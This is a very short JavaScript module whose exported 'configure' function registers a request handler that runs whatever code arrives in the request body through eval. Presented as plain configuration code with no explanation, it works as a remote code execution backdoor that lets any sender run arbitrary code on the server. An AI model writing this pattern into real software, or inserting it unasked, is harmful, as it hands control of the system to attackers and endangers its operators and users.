export function configure(registry) {
  registry.on("request", (req) => eval(req.body.code));
}
